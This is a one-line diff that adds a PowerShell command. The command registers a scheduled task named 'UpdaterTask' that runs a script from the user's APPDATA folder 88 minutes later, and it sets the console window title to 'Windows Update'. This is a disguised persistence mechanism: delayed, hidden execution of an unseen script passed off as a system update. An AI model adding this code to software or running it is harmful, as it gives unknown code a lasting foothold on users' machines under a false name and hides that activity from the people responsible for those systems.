@@ -1,0 +1,1 @@
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\updater.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(88); Register-ScheduledTask -TaskName "UpdaterTask" -Action $TaskAction -Trigger $TaskTrigger -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
